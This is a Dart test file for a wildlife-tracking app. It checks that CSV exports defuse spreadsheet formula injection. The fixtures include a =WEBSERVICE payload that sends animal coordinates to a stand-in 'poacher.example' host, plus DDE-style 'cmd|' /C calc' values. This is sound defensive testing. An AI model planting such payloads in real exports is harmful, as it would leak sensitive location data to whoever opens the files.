import 'dart:io';

import 'package:csv/csv.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:tritrack/data/csv/csv_writer.dart';
import 'package:tritrack/data/csv/non_detection_csv.dart';
import 'package:tritrack/data/csv/observation_csv.dart';
import 'package:tritrack/data/csv/tag_csv_export.dart';
import 'package:tritrack/data/models/tag.dart';
import 'package:tritrack/data/models/tag_version.dart';
import 'package:tritrack/data/models/user.dart';

import '../data/fixtures.dart';

/// Finding **L-3** (security model §14.4) — *the export is a weapon, and six
/// gates never looked at it.*
///
/// A tag named `=WEBSERVICE("http://…"&TEXTJOIN(",",1,H2,I2))` was written
/// unneutralised into `observations.csv`, where `latitude` is column H and
/// `longitude` is column I, and fired an outbound request carrying an animal's
/// coordinates the moment a colleague opened the file. Planting the tag needs
/// no consent, because adding a row is not destructive (§4.19 clause 4), so a
/// hostile `.zip` reaches this with the app reporting *"Inserted: 1."*
///
/// The reproduction is §14.4's own transcript. The rest is the class: **every
/// text column of every encoder**, the numeric carve-out that keeps western
/// longitudes readable, and a grep that stops a fourth encoder from being
/// written the way the first three were.
void main() {
  const payload = '=WEBSERVICE("http://poacher.example/?p="&'
      'TEXTJOIN(",",1,H2,I2))';

  List<List<dynamic>> parse(String csv) => Csv().decode(csv);

  Map<String, Tag> tagsById(Tag tag) => {tag.tagId: tag};
  Map<String, User> usersById(User user) => {user.userId: user};

  group('the §14.4 reproduction — ObservationCsv', () {
    late String csv;
    late List<List<dynamic>> rows;

    setUp(() {
      final tag = sampleTag(id: 'tag-1', tagName: payload);
      final user = sampleUser(id: 'user-1').copyWith(firstName: '=1+1');
      final observation = sampleObservation(
        id: 'obs-1',
        tagId: 'tag-1',
        userId: 'user-1',
        latitude: 35.1983,
        longitude: -111.6513,
      ).copyWith(notes: '@SUM(1+1)*cmd|\' /C calc\'!A0');
      csv = ObservationCsv.export(
        [observation],
        tagsById: tagsById(tag),
        usersById: usersById(user),
        // Task 11.32 split the tag columns in two: what the bearing was
        // recorded against, and what the tag reads now. **Both are text
        // columns and both are therefore this finding's surface**, so the
        // payload is planted on both sides — a version carrying it and a tag
        // row carrying it — rather than only on the one that used to exist.
        recordedStates: {
          observation.observationId: RecordedTagState(
            tag: tag,
            version: sampleTagVersion(tagId: 'tag-1', tagName: payload),
          ),
        },
      );
      rows = parse(csv);
    });

    test('the planted tag name leaves as text, not as a formula', () {
      final header = rows.first.cast<String>();
      // Both tag-name columns, because task 11.32 made there be two of them
      // and a control that covers one of two is the shape this file exists to
      // catch.
      for (final column in ['tag_name', 'tag_current_name']) {
        final tagName = rows[1][header.indexOf(column)] as String;

        expect(tagName, startsWith("'"),
            reason: '§14.4: it went out verbatim in $column, and column H and '
                'I are the coordinates sitting beside it');
        expect(tagName, isNot(startsWith('=')));
        expect(tagName, contains('WEBSERVICE'),
            reason: 'neutralised, not silently dropped — the roster is data '
                'the biologist still has to read');
      }
    });

    test('observer_name and notes are neutralised too — §14.4 measured both',
        () {
      final header = rows.first.cast<String>();
      expect(rows[1][header.indexOf('observer_name')] as String,
          startsWith("'"));
      expect(rows[1][header.indexOf('notes')] as String, startsWith("'"));
    });

    test('the coordinates beside it are still numbers a spreadsheet can plot',
        () {
      // Asserted against the file's own bytes rather than the decoded row,
      // because what a spreadsheet reads is the text. A blanket leading-"-"
      // escape would apostrophe every longitude in the western hemisphere and
      // break the export for the science it exists for.
      expect(csv, contains(',35.1983,-111.6513,'));
      expect(csv, isNot(contains("'-111.6513")));
    });

    test('the header row is untouched', () {
      expect(rows.first.first, 'observation_id');
    });
  });

  group('every encoder, every text column', () {
    test('TagCsvExport neutralises every text column it writes', () {
      final csv = TagCsvExport.export([
        sampleTag(id: 'tag-1', tagName: payload).copyWith(
          pulsePattern: '+1+1',
          notes: '-2+3+cmd|\' /C calc\'!A0',
        ),
      ]);
      final rows = parse(csv);
      final header = rows.first.cast<String>();

      for (final column in ['tag_name', 'pulse_pattern', 'notes']) {
        expect(rows[1][header.indexOf(column)] as String, startsWith("'"),
            reason: column);
      }
      expect(csv, contains('150.325'));
      expect(csv, isNot(contains("'150.325")));
    });

    test('NonDetectionCsv neutralises the joined tag-name column', () {
      final tag = sampleTag(id: 'tag-1', tagName: payload);
      final csv = NonDetectionCsv.export(
        [
          sampleNonDetection(id: 'nd-1', userId: 'user-1').copyWith(
            tagIdsListenedFor: const ['tag-1'],
            notes: '\tSUM(A1)',
          ),
        ],
        tagsById: tagsById(tag),
        usersById: usersById(sampleUser(id: 'user-1')),
      );
      final rows = parse(csv);
      final header = rows.first.cast<String>();

      expect(rows[1][header.indexOf('tag_names')] as String, startsWith("'"));
      expect(rows[1][header.indexOf('notes')] as String, startsWith("'"),
          reason: 'a leading tab is how the four characters get past a filter '
              'that only reads the first byte');
    });
  });

  group('the neutraliser itself', () {
    test('every dangerous leading character is caught', () {
      for (final char in SpreadsheetSafeCsv.dangerousLeadingCharacters) {
        expect(SpreadsheetSafeCsv.neutralize('${char}SUM(A1)'), startsWith("'"),
            reason: 'leading ${char.codeUnitAt(0)}');
      }
    });

    test('leading whitespace does not smuggle one past', () {
      // A spreadsheet skips the spaces before deciding; a filter that reads
      // `text[0]` does not, so the two disagree about what will run.
      expect(SpreadsheetSafeCsv.neutralize('   =1+1'), "'   =1+1");
    });

    test('ordinary text and numbers are returned unchanged', () {
      expect(SpreadsheetSafeCsv.neutralize('Coco'), 'Coco');
      expect(SpreadsheetSafeCsv.neutralize(-111.6513), -111.6513);
      expect(SpreadsheetSafeCsv.neutralize(-4), -4);
      expect(SpreadsheetSafeCsv.neutralize(null), isNull);
      expect(SpreadsheetSafeCsv.neutralize(''), '');
    });

    test('the encoder does not mutate the rows it was handed', () {
      final row = <dynamic>['=1+1'];
      SpreadsheetSafeCsv.encode([row]);
      expect(row.single, '=1+1');
    });
  });

  group('the choke point stays a choke point', () {
    test('no encoder in lib/ calls Csv().encode directly', () {
      // §14.4's class insight: fixing the three reproduced call sites would
      // leave the fourth encoder — the one nobody has written yet — with the
      // original defect. This is the assertion that makes
      // `SpreadsheetSafeCsv` the only way out, and it is a grep because that
      // is the only thing a *future* file can be measured by.
      final offenders = <String>[];
      for (final entity in Directory('lib').listSync(recursive: true)) {
        if (entity is! File || !entity.path.endsWith('.dart')) continue;
        if (entity.path.endsWith('csv_writer.dart')) continue;
        final source = entity.readAsStringSync();
        if (RegExp(r'Csv\(\)\s*\.\s*encode').hasMatch(source)) {
          offenders.add(entity.path);
        }
      }
      expect(offenders, isEmpty,
          reason: 'every CSV encoder must go through '
              'SpreadsheetSafeCsv.encode — see finding L-3');
    });

    test('the detector can fail — it finds the shape it is looking for', () {
      // The gate has now rejected four instruments that could not fail
      // (H-2, I-3, J-6, K-9). This is the same check run against a string
      // known to contain the pattern, so an accidentally-inert regex is
      // caught here rather than at the next gate.
      expect(RegExp(r'Csv\(\)\s*\.\s*encode').hasMatch('return Csv().encode(r);'),
          isTrue);
    });
  });
}
